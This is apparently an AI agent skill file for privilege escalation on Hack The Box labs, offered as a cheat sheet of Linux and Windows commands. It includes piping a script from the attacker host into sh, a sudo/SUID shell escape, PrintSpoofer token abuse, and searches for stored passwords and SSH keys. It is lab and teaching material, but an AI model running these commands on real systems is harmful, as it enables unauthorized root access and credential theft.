---
name: htb-privesc
description: >
  Local privilege escalation (Linux and Windows) on an authorized HTB box/lab.
  Trigger as soon as you have an unprivileged user shell and want to reach
  root/SYSTEM. Covers: automated enumeration (linpeas/winpeas, pspy,
  linux-exploit-suggester), classic vectors (sudo, SUID, cron, capabilities,
  Windows services and permissions, tokens), and exploitation of the vector found.
  Produces root access (Linux) or SYSTEM/Administrator (Windows) and the root flag.
metadata:
  type: reference
  category: privilege-escalation
  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
---

# HTB — Privilege escalation

## When to use this skill
You have a low-privilege shell (`www-data`, a standard user) and are looking for
root/SYSTEM. Method: enumerate first, then exploit the cleanest vector.

## Step 0 — Automated enumeration
```bash
# Transfer from /opt/PEASS-ng (see htb-shells for the transfer)
# Linux
curl http://$LHOST/linpeas.sh | sh          # or drop it then: ./linpeas.sh
pspy64                                        # processes/cron in real time
./linux-exploit-suggester.sh                  # candidate kernel exploits
```
```powershell
# Windows
.\winPEASx64.exe
whoami /priv ; whoami /groups
```

## LINUX — classic vectors (in the order to test)
```bash
# 1) misconfigured sudo  -> gtfobins.github.io
sudo -l
#   e.g.: (ALL) NOPASSWD: /usr/bin/find  ->  sudo find . -exec /bin/sh \; -quit

# 2) SUID binaries
find / -perm -4000 -type f 2>/dev/null
#   unusual binary -> GTFOBins (SUID)

# 3) Capabilities
getcap -r / 2>/dev/null
#   cap_setuid+ep on python/perl -> setuid(0)

# 4) Cron jobs (world-writable scripts run by root) -> see pspy
cat /etc/crontab ; ls -la /etc/cron.*

# 5) Sensitive files / creds
ls -la /home/*/.ssh/ ; find / -name "*.kdbx" 2>/dev/null
grep -rIn "password" /var/www 2>/dev/null

# 6) Kernel exploit (last resort) -> linux-exploit-suggester
```
Reflexes: `sudo -l` and SUID + GTFOBins solve a large share of boxes.

## WINDOWS — classic vectors
```powershell
# 1) Token privileges
whoami /priv
#   SeImpersonate/SeAssignPrimaryToken -> PrintSpoofer / GodPotato / JuicyPotato
.\PrintSpoofer64.exe -i -c cmd

# 2) Services: unquoted paths, modifiable binaries, weak autostart
#   (winPEAS highlights them) -> replace the binary or reconfigure the service

# 3) AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#   if both =1 -> msiexec of a malicious .msi

# 4) Stored creds
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
#   unattend.xml, web.config, Groups.xml (GPP) files

# 5) History / user files, scheduled tasks
```

## Cross-cutting reflexes
- Compare the PEAS output against the vectors above: aim for the most reliable first.
- Always re-check **password reuse** (root password reused elsewhere).
- On AD, escalation may be *domain*-wide rather than local → go back to `htb-active-directory`.
- Do not launch a destructive kernel exploit if a clean vector exists.

## End of box
```bash
cat /root/root.txt           # Linux
type C:\Users\Administrator\Desktop\root.txt   # Windows
```
